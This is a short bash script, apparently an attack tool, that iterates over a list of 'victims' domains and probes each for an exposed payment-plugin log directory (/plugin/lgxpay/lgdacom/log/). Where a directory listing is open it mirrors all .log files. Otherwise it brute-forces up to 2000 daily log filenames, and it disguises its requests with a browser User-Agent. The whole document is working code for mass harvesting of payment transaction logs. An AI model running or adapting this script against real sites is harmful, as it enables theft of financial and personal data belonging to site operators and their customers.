#!/usr/bin/bash
# 
victims=("example.com
example.org")

for domain in ${victims[@]}; 
do 
    if [ $(curl --max-time 2 -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -s -o /dev/null -I -w "%{http_code}" -L http://$domain/plugin/lgxpay/lgdacom/log/) == 200 ]; then
    mkdir ./result/$domain
    echo "Downloading logs from $domain's index page"
    wget -q --connect-timeout=1 -r --level=1 -np --accept=*.log http://$domain/plugin/lgxpay/lgdacom/log/ -P ./result/$domain/
    echo "Finish. Finding next victim..."
    elif [ $(curl --max-time 2 -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -s -o /dev/null -I -w "%{http_code}" -L http://$domain/plugin/lgxpay/lgdacom/log/log_`date +%Y%m%d`) == 200 ]; then
        echo "Detected there is no Index Page. Start Brute-Force from today's log file. "
        mkdir ./result/$domain
        for ((i=0;i<2000;i++)); do
            echo "Try Downloading log_`date +%Y%m%d -d -$i"day"` from $domain"
            wget -q http://$domain/plugin/lgxpay/lgdacom/log/log_`date +%Y%m%d -d -$i"day"`.log -P ./result/$domain/
        done
    elif [ $(curl --max-time 2 -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -s -o /dev/null -I -w "%{http_code}" -L http://$domain/plugin/lgxpay/lgdacom/log/) == 403 ]; then
        echo "Detected there is no Index Page. And no today's log file. Start Brute-Force from today's log file. "
        mkdir ./result/$domain
        for ((i=0;i<2000;i++)); do
            echo "Try Downloading log_`date +%Y%m%d -d -$i"day"` from $domain"
            wget -q http://$domain/plugin/lgxpay/lgdacom/log/log_`date +%Y%m%d -d -$i"day"`.log -P ./result/$domain/
        done
    else  
    echo "?? 아 이건 좀...($domain)"
    fi
done
